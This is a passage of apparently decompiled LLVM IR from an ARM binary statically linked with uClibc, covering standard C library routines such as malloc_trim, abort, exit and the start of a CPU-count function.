  %v0_1514c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1513c

dec_label_pc_1513c:                               ; preds = %dec_label_pc_150ec, %dec_label_pc_15130
  %v0_151c8 = phi i32 [ %v1_150f8, %dec_label_pc_150ec ], [ %v2_15138, %dec_label_pc_15130 ]
  %v0_1514c = phi i32 [ %v3_15100, %dec_label_pc_150ec ], [ %v0_1514c.pre, %dec_label_pc_15130 ]
  %v1_15160 = phi i32 [ %v2_150f8, %dec_label_pc_150ec ], [ %v0_15148.pre, %dec_label_pc_15130 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_15140 = load i32, i32* @r7, align 4
  %v2_15140 = add i32 %v0_15140, 64
  %v3_15140 = inttoptr i32 %v2_15140 to i32*
  %v4_15140 = load i32, i32* %v3_15140, align 4
  store i32 %v4_15140, i32* %r2.global-to-local, align 4
  %v1_15144 = add i32 %v4_15140, 44
  %v2_15144 = inttoptr i32 %v1_15144 to i32*
  %v3_15144 = load i32, i32* %v2_15144, align 4
  store i32 %v3_15144, i32* %r3.global-to-local, align 4
  %v9_15148 = icmp eq i32 %v1_15160, %v3_15144
  %v1_1514c = and i32 %v0_1514c, -4
  store i32 %v1_1514c, i32* %r0.global-to-local, align 4
  br i1 %v9_15148, label %dec_label_pc_151c8, label %dec_label_pc_15154

dec_label_pc_15154:                               ; preds = %dec_label_pc_1513c
  %v2_15154 = add i32 %v1_15160, %v1_1514c
  store i32 %v2_15154, i32* %r3.global-to-local, align 4
  %v1_15158 = add i32 %v2_15154, 4
  %v2_15158 = inttoptr i32 %v1_15158 to i32*
  %v3_15158 = load i32, i32* %v2_15158, align 4
  store i32 %v3_15158, i32* %r3.global-to-local, align 4
  %v1_1515c = urem i32 %v3_15158, 2
  %v2_1515c = icmp eq i32 %v1_1515c, 0
  %v2_15160 = add i32 %v1_15160, 4
  %v3_15160 = inttoptr i32 %v2_15160 to i32*
  store i32 %v1_1514c, i32* %v3_15160, align 4
  br i1 %v2_1515c, label %dec_label_pc_15168, label %dec_label_pc_15154.dec_label_pc_15198_crit_edge

dec_label_pc_15154.dec_label_pc_15198_crit_edge:  ; preds = %dec_label_pc_15154
  %v0_151a8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15198

dec_label_pc_15168:                               ; preds = %dec_label_pc_15154
  %v0_15168 = load i32, i32* %lr.global-to-local, align 4
  %v1_15168 = add i32 %v0_15168, 8
  %v2_15168 = inttoptr i32 %v1_15168 to i32*
  %v3_15168 = load i32, i32* %v2_15168, align 4
  store i32 %v3_15168, i32* %r1.global-to-local, align 4
  %v1_1516c = add i32 %v3_15168, 12
  %v2_1516c = inttoptr i32 %v1_1516c to i32*
  %v3_1516c = load i32, i32* %v2_1516c, align 4
  store i32 %v3_1516c, i32* %r3.global-to-local, align 4
  %v9_15170 = icmp eq i32 %v3_1516c, %v0_15168
  %v1_15174 = add i32 %v0_15168, 12
  %v2_15174 = inttoptr i32 %v1_15174 to i32*
  %v3_15174 = load i32, i32* %v2_15174, align 4
  store i32 %v3_15174, i32* %r2.global-to-local, align 4
  br i1 %v9_15170, label %dec_label_pc_1517c, label %dec_label_pc_15188

dec_label_pc_1517c:                               ; preds = %dec_label_pc_15168
  %v1_1517c = add i32 %v3_15174, 8
  %v2_1517c = inttoptr i32 %v1_1517c to i32*
  %v3_1517c = load i32, i32* %v2_1517c, align 4
  store i32 %v3_1517c, i32* %r3.global-to-local, align 4
  %v9_15180 = icmp eq i32 %v3_1517c, %v0_15168
  br i1 %v9_15180, label %dec_label_pc_1518c, label %dec_label_pc_15188

dec_label_pc_15188:                               ; preds = %dec_label_pc_15168, %dec_label_pc_15124, %dec_label_pc_15108, %dec_label_pc_1517c
  %v0_15188 = call i32 @abort()
  store i32 %v0_15188, i32* %r0.global-to-local, align 4
  %v0_1518c.pre = load i32, i32* @r1, align 4
  %v1_1518c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1518c

dec_label_pc_1518c:                               ; preds = %dec_label_pc_1517c, %dec_label_pc_15188
  %v1_1518c = phi i32 [ %v3_15174, %dec_label_pc_1517c ], [ %v1_1518c.pre, %dec_label_pc_15188 ]
  %v0_1518c = phi i32 [ %v3_15168, %dec_label_pc_1517c ], [ %v0_1518c.pre, %dec_label_pc_15188 ]
  %v2_1518c = add i32 %v1_1518c, 8
  %v3_1518c = inttoptr i32 %v2_1518c to i32*
  store i32 %v0_1518c, i32* %v3_1518c, align 4
  %v0_15190 = load i32, i32* %r2.global-to-local, align 4
  %v1_15190 = load i32, i32* %r1.global-to-local, align 4
  %v2_15190 = add i32 %v1_15190, 12
  %v3_15190 = inttoptr i32 %v2_15190 to i32*
  store i32 %v0_15190, i32* %v3_15190, align 4
  %v0_15194 = load i32, i32* %ip.global-to-local, align 4
  %v1_15194 = load i32, i32* %r0.global-to-local, align 4
  %v2_15194 = add i32 %v1_15194, %v0_15194
  store i32 %v2_15194, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15198

dec_label_pc_15198:                               ; preds = %dec_label_pc_15154.dec_label_pc_15198_crit_edge, %dec_label_pc_1518c
  %v0_151a8 = phi i32 [ %v0_151a8.pre, %dec_label_pc_15154.dec_label_pc_15198_crit_edge ], [ %v2_15194, %dec_label_pc_1518c ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1519c = load i32, i32* @r7, align 4
  %v2_1519c = add i32 %v0_1519c, 64
  %v3_1519c = inttoptr i32 %v2_1519c to i32*
  %v4_1519c = load i32, i32* %v3_1519c, align 4
  %v1_151a0 = add i32 %v4_1519c, 52
  store i32 %v1_151a0, i32* %r3.global-to-local, align 4
  %v1_151a4 = add i32 %v4_1519c, 60
  %v2_151a4 = inttoptr i32 %v1_151a4 to i32*
  %v3_151a4 = load i32, i32* %v2_151a4, align 4
  store i32 %v3_151a4, i32* %r1.global-to-local, align 4
  %v1_151a8 = or i32 %v0_151a8, 1
  store i32 %v1_151a8, i32* %r2.global-to-local, align 4
  %v1_151ac = load i32, i32* %r4.global-to-local, align 4
  %v2_151ac = add i32 %v1_151ac, 12
  %v3_151ac = inttoptr i32 %v2_151ac to i32*
  store i32 %v1_151a0, i32* %v3_151ac, align 4
  %v0_151b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_151b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_151b0 = add i32 %v1_151b0, 8
  %v3_151b0 = inttoptr i32 %v2_151b0 to i32*
  store i32 %v0_151b0, i32* %v3_151b0, align 4
  %v0_151b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_151b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_151b4 = add i32 %v1_151b4, 4
  %v3_151b4 = inttoptr i32 %v2_151b4 to i32*
  store i32 %v0_151b4, i32* %v3_151b4, align 4
  %v0_151b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_151b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_151b8 = add i32 %v1_151b8, %v0_151b8
  %v4_151b8 = inttoptr i32 %v3_151b8 to i32*
  store i32 %v0_151b8, i32* %v4_151b8, align 4
  %v0_151bc = load i32, i32* %r4.global-to-local, align 4
  %v1_151bc = load i32, i32* %r1.global-to-local, align 4
  %v2_151bc = add i32 %v1_151bc, 12
  %v3_151bc = inttoptr i32 %v2_151bc to i32*
  store i32 %v0_151bc, i32* %v3_151bc, align 4
  %v0_151c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_151c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_151c0 = add i32 %v1_151c0, 8
  %v3_151c0 = inttoptr i32 %v2_151c0 to i32*
  store i32 %v0_151c0, i32* %v3_151c0, align 4
  br label %dec_label_pc_151d8

dec_label_pc_151c8:                               ; preds = %dec_label_pc_1513c
  %v2_151c8 = add i32 %v1_1514c, %v0_151c8
  store i32 %v2_151c8, i32* %ip.global-to-local, align 4
  %v1_151cc = or i32 %v2_151c8, 1
  store i32 %v1_151cc, i32* %r3.global-to-local, align 4
  %v0_151d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_151d0, i32* %v2_15144, align 4
  %v0_151d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_151d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_151d4 = add i32 %v1_151d4, 4
  %v3_151d4 = inttoptr i32 %v2_151d4 to i32*
  store i32 %v0_151d4, i32* %v3_151d4, align 4
  br label %dec_label_pc_151d8

dec_label_pc_151d8:                               ; preds = %dec_label_pc_15198, %dec_label_pc_151c8
  %v0_151d8 = load i32, i32* %ip.global-to-local, align 4
  %v3_151dc = icmp ult i32 %v0_151d8, 131070
  br i1 %v3_151dc, label %dec_label_pc_15248, label %dec_label_pc_151e0

dec_label_pc_151e0:                               ; preds = %dec_label_pc_151d8
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_151e4 = load i32, i32* @r7, align 4
  %v2_151e4 = add i32 %v0_151e4, 64
  %v3_151e4 = inttoptr i32 %v2_151e4 to i32*
  %v4_151e4 = load i32, i32* %v3_151e4, align 4
  store i32 %v4_151e4, i32* @r4, align 4
  %v1_151e8 = inttoptr i32 %v4_151e4 to i32*
  %v2_151e8 = load i32, i32* %v1_151e8, align 4
  store i32 %v2_151e8, i32* %r3.global-to-local, align 4
  %v1_151ec = and i32 %v2_151e8, 2
  %v2_151ec = icmp eq i32 %v1_151ec, 0
  br i1 %v2_151ec, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_151e0
  store i32 %v4_151e4, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_151e0, %bb
  %v1_151f4 = xor i1 %v2_151ec, true
  call void @__pseudo_cond_branch(i1 %v1_151f4, i32 ptrtoint (i32* @global_var_14e98.877 to i32))
  %v0_151f8 = load i32, i32* @r4, align 4
  %v1_151f8 = add i32 %v0_151f8, 44
  %v2_151f8 = inttoptr i32 %v1_151f8 to i32*
  %v3_151f8 = load i32, i32* %v2_151f8, align 4
  store i32 %v3_151f8, i32* %r3.global-to-local, align 4
  %v1_151fc = add i32 %v3_151f8, 4
  %v2_151fc = inttoptr i32 %v1_151fc to i32*
  %v3_151fc = load i32, i32* %v2_151fc, align 4
  store i32 %v3_151fc, i32* %r3.global-to-local, align 4
  %v1_15200 = add i32 %v0_151f8, 836
  %v2_15200 = inttoptr i32 %v1_15200 to i32*
  %v3_15200 = load i32, i32* %v2_15200, align 4
  store i32 %v3_15200, i32* %r2.global-to-local, align 4
  %v1_15204 = and i32 %v3_151fc, -4
  store i32 %v1_15204, i32* %r3.global-to-local, align 4
  %v3_15208 = icmp ult i32 %v1_15204, %v3_15200
  br i1 %v3_15208, label %dec_label_pc_15248, label %dec_label_pc_15210

dec_label_pc_15210:                               ; preds = %bb16
  store i32 %v0_151f8, i32* %r1.global-to-local, align 4
  %v1_15214 = add i32 %v0_151f8, 840
  %v2_15214 = inttoptr i32 %v1_15214 to i32*
  %v3_15214 = load i32, i32* %v2_15214, align 4
  store i32 %v3_15214, i32* %r0.global-to-local, align 4
  %v2_15218 = call i32 @__malloc_trim(i32 %v3_15214, i32 %v0_151f8)
  store i32 %v2_15218, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15248

dec_label_pc_15220:                               ; preds = %dec_label_pc_150e4
  %v2_15220 = inttoptr i32 %v1_150b4 to i32*
  %v3_15220 = load i32, i32* %v2_15220, align 4
  store i32 %v3_15220, i32* %r0.global-to-local, align 4
  %v1_15224 = add i32 %v4_150a4, 848
  %v2_15224 = inttoptr i32 %v1_15224 to i32*
  %v3_15224 = load i32, i32* %v2_15224, align 4
  store i32 %v3_15224, i32* %r2.global-to-local, align 4
  %v1_15228 = add i32 %v4_150a4, 868
  %v2_15228 = inttoptr i32 %v1_15228 to i32*
  %v3_15228 = load i32, i32* %v2_15228, align 4
  %v2_1522c = add i32 %v3_15220, %v1_150b0
  store i32 %v2_1522c, i32* %r1.global-to-local, align 4
  %v1_15230 = add i32 %v3_15224, -1
  store i32 %v1_15230, i32* %r2.global-to-local, align 4
  %v2_15234 = sub i32 %v3_15228, %v2_1522c
  store i32 %v2_15234, i32* %r3.global-to-local, align 4
  store i32 %v2_15234, i32* %v2_15228, align 4
  %v1_1523c = load i32, i32* @lr, align 4
  %v2_1523c = add i32 %v1_1523c, 848
  %v3_1523c = inttoptr i32 %v2_1523c to i32*
  store i32 %v1_15230, i32* %v3_1523c, align 4
  %v0_15240 = load i32, i32* %r0.global-to-local, align 4
  %v1_15240 = load i32, i32* @r5, align 4
  %v2_15240 = sub i32 %v1_15240, %v0_15240
  store i32 %v2_15240, i32* %r0.global-to-local, align 4
  %v4_15244 = call i32 @munmap(i32 %v2_15240, i32 %v2_1522c, i32 %v1_15230, i32 %v2_15234)
  store i32 %v4_15244, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15248

dec_label_pc_15248:                               ; preds = %bb16, %dec_label_pc_151d8, %dec_label_pc_15210, %dec_label_pc_150c4, %dec_label_pc_15220
  store i32 %v2_15058, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_15254 = load i32, i32* @r7, align 4
  %v2_15254 = add i32 %v0_15254, 44
  %v3_15254 = inttoptr i32 %v2_15254 to i32*
  %v4_15254 = load i32, i32* %v3_15254, align 4
  store i32 %v4_15254, i32* %ip.global-to-local, align 4
  store i32 86624, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15254)
  br label %dec_label_pc_15260

dec_label_pc_15260:                               ; preds = %entry, %dec_label_pc_15248
  store i32 %v3_1504c, i32* @r4, align 4
  store i32 %v6_1504c, i32* @r5, align 4
  store i32 %v9_1504c, i32* @r6, align 4
  store i32 %v12_1504c, i32* @r7, align 4
  store i32 %v18_1504c, i32* @lr, align 4
  ret i32 %v2_15058

; uselistorder directives
  uselistorder i32 %v0_151f8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_151b8, { 1, 0 }
  uselistorder i32 %v1_150f8, { 1, 0 }
  uselistorder i32 %v0_150f8, { 1, 0 }
  uselistorder i32 %v3_150cc, { 1, 0 }
  uselistorder i32 %v1_150b0, { 1, 0, 2 }
  uselistorder i32 %v2_150ac, { 1, 2, 0, 3 }
  uselistorder i32 %v4_150a4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15054, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %ip.global-to-local, { 0, 4, 1, 5, 2, 6, 10, 3, 7, 8, 9, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15260, { 1, 0 }
  uselistorder label %dec_label_pc_15248, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_151d8, { 1, 0 }
  uselistorder label %dec_label_pc_15198, { 1, 0 }
  uselistorder label %dec_label_pc_1518c, { 1, 0 }
  uselistorder label %dec_label_pc_15188, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1513c, { 1, 0 }
}

define i32 @function_15270(i32 %arg1) local_unnamed_addr {
dec_label_pc_15270:
  %v0_15270 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15270, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_15270
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15270, %bb
  %v4_15284 = phi i32 [ %arg1, %dec_label_pc_15270 ], [ 0, %bb ]
  ret i32 %v4_15284

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15288 = load i32, i32* @r4, align 4
  store i32 %v3_15288, i32* %stack_var_-12, align 4
  %v6_15288 = load i32, i32* @r5, align 4
  %v4_15298 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_15298, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_15298, i32* @r0, align 4
  %v0_152a8 = call i32 @__malloc_consolidate()
  %v0_152ac = load i32, i32* @r4, align 4
  store i32 %v0_152ac, i32* %r0.global-to-local, align 4
  %v0_152b0 = load i32, i32* @r5, align 4
  %v2_152b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_152b8, i32* @r4, align 4
  store i32 %v6_15288, i32* @r5, align 4
  %v2_152bc = call i32 @__malloc_trim(i32 %v0_152ac, i32 %v0_152b0)
  store i32 %v2_152bc, i32* %r0.global-to-local, align 4
  %v0_152c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_152c0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_152c0 = load i32, i32* @r8, align 4
  %v5_152c0 = mul i32 %v2_152c0, 8
  %v6_152c0 = and i32 %v5_152c0, %v2_152bc
  call void @__pseudo_branch(i32 %v6_152c0)
  %v0_152c4.pr = load i1, i1* @cpsr_z, align 1
  %v2_152c4 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_152c4.pr, label %bb6, label %.thread

bb6:                                              ; preds = %bb
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %entry, %bb6
  %v4_152c4 = phi i32 [ %v2_152bc, %entry ], [ 0, %bb6 ], [ %v2_152c4, %bb ]
  ret i32 %v4_152c4

; uselistorder directives
  uselistorder i32 %v2_152bc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 4, 2, 0 }
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r5, align 4
  %v4_152e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 16) to i32*), align 4
  store i32 86764, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_152e0)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_15308 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_15310 = load i32, i32* @r5, align 4
  %v2_15310 = add i32 %v0_15310, 636
  %v3_15310 = inttoptr i32 %v2_15310 to i32*
  %v4_15310 = load i32, i32* %v3_15310, align 4
  %v2_15314 = icmp eq i32 %v4_15310, 0
  br i1 %v2_15314, label %dec_label_pc_1531c, label %dec_label_pc_1535c

dec_label_pc_1531c:                               ; preds = %entry
  store i32 1, i32* %v3_15310, align 4
  br label %dec_label_pc_15324

dec_label_pc_15324:                               ; preds = %dec_label_pc_1536c, %dec_label_pc_1531c
  %v0_15328 = load i32, i32* @r5, align 4
  %v2_15328 = add i32 %v0_15328, 212
  store i32 %v2_15328, i32* @r4, align 4
  %v2_15334 = add i32 %v0_15328, 68
  %v3_15334 = inttoptr i32 %v2_15334 to i32*
  %v4_15334 = load i32, i32* %v3_15334, align 4
  call void @__pseudo_branch(i32 %v4_15334)
  %v1_15344 = call i32 @__GI_raise(i32 6)
  %v0_15350 = load i32, i32* @r5, align 4
  %v2_15350 = add i32 %v0_15350, 16
  %v3_15350 = inttoptr i32 %v2_15350 to i32*
  %v4_15350 = load i32, i32* %v3_15350, align 4
  store i32 86876, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15350)
  %v0_15360.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1535c

dec_label_pc_1535c:                               ; preds = %entry, %dec_label_pc_15324
  %v1_15374 = phi i32 [ %v0_15310, %entry ], [ %v0_15360.pre, %dec_label_pc_15324 ]
  %v2_15360 = add i32 %v1_15374, 636
  %v3_15360 = inttoptr i32 %v2_15360 to i32*
  %v4_15360 = load i32, i32* %v3_15360, align 4
  %v7_15364 = icmp eq i32 %v4_15360, 1
  br i1 %v7_15364, label %dec_label_pc_1536c, label %dec_label_pc_153a8

dec_label_pc_1536c:                               ; preds = %dec_label_pc_1535c
  %v2_1536c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1536c, i32* @r4, align 4
  store i32 2, i32* %v3_15360, align 4
  %v3_15384 = bitcast i32* %stack_var_-28 to i8*
  %v4_15384 = call i32 @__GI_memset(i8* %v3_15384, i32 0, i32 20)
  %v3_153a0 = call i32 @__libc_sigaction(i32 6, i32 %v2_1536c, i32 0)
  br label %dec_label_pc_15324

dec_label_pc_153a8:                               ; preds = %dec_label_pc_1535c
  %v7_153a8 = icmp eq i32 %v4_15360, 2
  br i1 %v7_153a8, label %dec_label_pc_153b0, label %dec_label_pc_153bc

dec_label_pc_153b0:                               ; preds = %dec_label_pc_153a8
  store i32 3, i32* %v3_15360, align 4
  %v0_153b8 = call i32 @abort()
  %v0_153bc.pre = load i32, i32* @r5, align 4
  %v1_153bc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_153bc

dec_label_pc_153bc:                               ; preds = %dec_label_pc_153a8, %dec_label_pc_153b0
  %v3_153c8 = phi i32 [ 636, %dec_label_pc_153a8 ], [ %v1_153bc.pre, %dec_label_pc_153b0 ]
  %v2_153c8 = phi i32 [ %v1_15374, %dec_label_pc_153a8 ], [ %v0_153bc.pre, %dec_label_pc_153b0 ]
  %v2_153bc = add i32 %v2_153c8, %v3_153c8
  %v3_153bc = inttoptr i32 %v2_153bc to i32*
  %v4_153bc = load i32, i32* %v3_153bc, align 4
  %v7_153c0 = icmp eq i32 %v4_153bc, 3
  br i1 %v7_153c0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_153bc
  store i32 4, i32* %v3_153bc, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_153bc, %bb
  call void @__pseudo_cond_branch(i1 %v7_153c0, i32 ptrtoint (i32* @global_var_16d90.886 to i32))
  br label %dec_label_pc_153d4

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153d4, %.thread2
  %v0_153d4 = call i32 @abort()
  br label %dec_label_pc_153d4

; uselistorder directives
  uselistorder i32* %v3_15360, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_153bc, { 1, 0 }
  uselistorder label %dec_label_pc_1535c, { 1, 0 }
}

define i32 @function_153e0(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_153e0:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_153e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_153e0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_153e0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_153e0, %bb
  %v4_153ec = phi i32 [ %tmp, %dec_label_pc_153e0 ], [ 0, %bb ]
  ret i32 %v4_153ec

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r5, align 4
  %v4_153fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 140) to i32*), align 4
  store i32 %v4_153fc, i32* @r4, align 4
  %v2_15404 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_1541c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1541c)
  %v0_15430 = load i32, i32* @r5, align 4
  %v2_15430 = add i32 %v0_15430, 16
  %v3_15430 = inttoptr i32 %v2_15430 to i32*
  %v4_15430 = load i32, i32* %v3_15430, align 4
  call void @__pseudo_branch(i32 %v4_15430)
  %v0_15440 = load i32, i32* @r5, align 4
  %v2_15440 = add i32 %v0_15440, 640
  %v3_15440 = inttoptr i32 %v2_15440 to i32*
  %v4_15440 = load i32, i32* %v3_15440, align 4
  %v2_15448 = icmp eq i32 %v4_15440, 0
  br i1 %v2_15448, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_15454 = xor i1 %v2_15448, true
  call void @__pseudo_cond_branch(i1 %v2_15454, i32 %v4_15440)
  store i32 %v2_15404, i32* @r0, align 4
  %v0_15464 = load i32, i32* @r5, align 4
  %v2_15464 = add i32 %v0_15464, 44
  %v3_15464 = inttoptr i32 %v2_15464 to i32*
  %v4_15464 = load i32, i32* %v3_15464, align 4
  call void @__pseudo_branch(i32 %v4_15464)
  %v0_15470 = call i32 @__GI___uClibc_fini()
  %v0_15478 = load i32, i32* @r5, align 4
  %v2_15478 = add i32 %v0_15478, -50224
  %v2_15480 = icmp eq i32 %v2_15478, 0
  br i1 %v2_15480, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_15488 = xor i1 %v2_15480, true
  call void @__pseudo_cond_branch(i1 %v2_15488, i32 %v2_15478)
  %v0_1548c = load i32, i32* @r6, align 4
  %v1_15490 = call i32 @__GI__exit(i32 %v0_1548c)
  %v0_15494 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15494, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v5_15494 = call i32 @__libc_errno(i32 %v1_15490)
  %v0_15498.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15498.pr, label %bb11, label %.thread6

bb11:                                             ; preds = %bb10
  br label %.thread6

.thread6:                                         ; preds = %bb10, %bb9, %bb11
  %v4_154ac = phi i32 [ %v5_15494, %bb10 ], [ %v1_15490, %bb9 ], [ 0, %bb11 ]
  ret i32 %v4_154ac

; uselistorder directives
  uselistorder label %.thread6, { 2, 0, 1 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 -34008), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_154d4 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 -34008))
  store i32 %v1_154d4, i32* @r6, align 4
  %v2_154d8 = icmp eq i32 %v1_154d4, 0
  br i1 %v2_154d8, label %dec_label_pc_15558, label %dec_label_pc_154e0

dec_label_pc_154e0:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_154e8 = load i32, i32* @r4, align 4
  %v2_154e8 = add i32 %v0_154e8, -37060
  store i32 %v2_154e8, i32* @r8, align 4
  %v2_154ec = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_154ec, i32* @r7, align 4
  br label %bb18

dec_label_pc_154f4:                               ; preds = %bb18
  %v3_154f4 = load i32, i32* %stack_var_-36, align 4
  %v1_154f8 = inttoptr i32 %v3_154f4 to i32*
  %v2_154f8 = load i32, i32* %v1_154f8, align 4
  %v1_154fc = inttoptr i32 %v2_154f8 to i8*
  %v2_154fc = load i8, i8* %v1_154fc, align 1
  %v7_15500 = icmp eq i8 %v2_154fc, 99
  br i1 %v7_15500, label %dec_label_pc_15508, label %.backedge3

dec_label_pc_15508:                               ; preds = %dec_label_pc_154f4
  %v1_15508 = add i32 %v2_154f8, 1
  %v2_15508 = inttoptr i32 %v1_15508 to i8*
  %v3_15508 = load i8, i8* %v2_15508, align 1
  %v7_1550c = icmp eq i8 %v3_15508, 112
  br i1 %v7_1550c, label %dec_label_pc_15514, label %.backedge3

dec_label_pc_15514:                               ; preds = %dec_label_pc_15508
  %v1_15514 = add i32 %v2_154f8, 2
  %v2_15514 = inttoptr i32 %v1_15514 to i8*
  %v3_15514 = load i8, i8* %v2_15514, align 1
  %v7_15518 = icmp eq i8 %v3_15514, 117
  br i1 %v7_15518, label %dec_label_pc_15520, label %.backedge3

dec_label_pc_15520:                               ; preds = %dec_label_pc_15514
  %v1_15520 = add i32 %v2_154f8, 3
  %v2_15520 = inttoptr i32 %v1_15520 to i8*
  %v3_15520 = load i8, i8* %v2_15520, align 1
  %v4_15520 = zext i8 %v3_15520 to i32
  %v0_15524 = load i32, i32* @r4, align 4
  %v1_15524 = load i32, i32* @sl, align 4
  %v2_15524 = add i32 %v1_15524, %v0_15524
